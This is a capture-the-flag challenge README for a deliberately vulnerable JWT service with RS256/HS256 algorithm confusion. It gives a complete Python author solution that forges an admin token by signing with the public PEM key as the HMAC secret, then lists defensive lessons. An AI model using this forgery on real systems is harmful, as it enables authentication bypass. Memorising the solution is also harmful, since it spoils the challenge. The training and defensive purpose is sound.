# JWT Algorithm Confusion — TokenStop

A JWT issuer/verifier that accepts both `RS256` and `HS256` with
the same key parameter. On the HS256 path the verifier uses the
PEM-encoded public key (downloadable at `/public-key`) as the
HMAC secret. The public key is, by design, public — so the
attacker can sign any token they want.

This is **JWT Algorithm Confusion**, sibling of `alg=none`.

## Player target

Forge an admin JWT without the private key. Read `/admin/flag`.

## Author solution

```python
import base64, hashlib, hmac, json, sys, urllib.request

TARGET = "http://target:5000"
pem = urllib.request.urlopen(f"{TARGET}/public-key").read()

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "pwned", "role": "admin"}
h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{h}.{p}".encode()
sig = hmac.new(pem, signing_input, hashlib.sha256).digest()
token = f"{h}.{p}.{b64url(sig)}"

import urllib.request
req = urllib.request.Request(f"{TARGET}/admin/flag",
    headers={"Authorization": f"Bearer {token}"})
print(urllib.request.urlopen(req).read().decode())
```

Key detail: the HMAC secret is the **literal PEM bytes**, newlines
and `-----BEGIN PUBLIC KEY-----` markers included. Don't strip
anything.

## Why this is the lesson

* **Pin the algorithm.** Verifiers must accept only the
  algorithm(s) the issuer is configured to use:
  `algorithms=['RS256']`, never a list that mixes asymmetric and
  symmetric.
* **Type-separate keys.** Treat asymmetric keys as objects, not
  strings. Modern PyJWT (2.x+) explicitly refuses a PEM-looking
  byte string as an HMAC secret — this app's hand-rolled
  validator skipped that guard.
* **JWS != session.** Tokens don't replace server-side
  authorisation. Even a forged token shouldn't be the only thing
  standing between the caller and an admin resource.
